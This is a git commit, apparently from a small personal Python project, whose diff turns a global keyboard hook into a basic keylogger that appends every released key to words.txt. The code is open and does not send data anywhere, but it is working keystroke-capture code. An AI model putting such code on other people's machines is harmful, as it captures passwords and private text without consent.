729423709b8b12cb7c6aeaa94e470d3aa6ca24de
Orr Hauptman <or.hau2008@gmail.com>
2025-06-11 14:08:33 +0300

    save words in file

--- main.py
+++ main.py
@@ -2,7 +2,10 @@ import keyboard
 
 
 def new_event(event : keyboard.KeyboardEvent) -> None :
-    print(f"hi{event.name} - {event.event_type}")
+    print(f"The key is - {event.name}")
+    with open("words.txt", "a") as file:
+        file.write(f"{event.name} " )
+        file.flush()
 
 keyboard.on_release(callback=new_event)
 keyboard.wait()
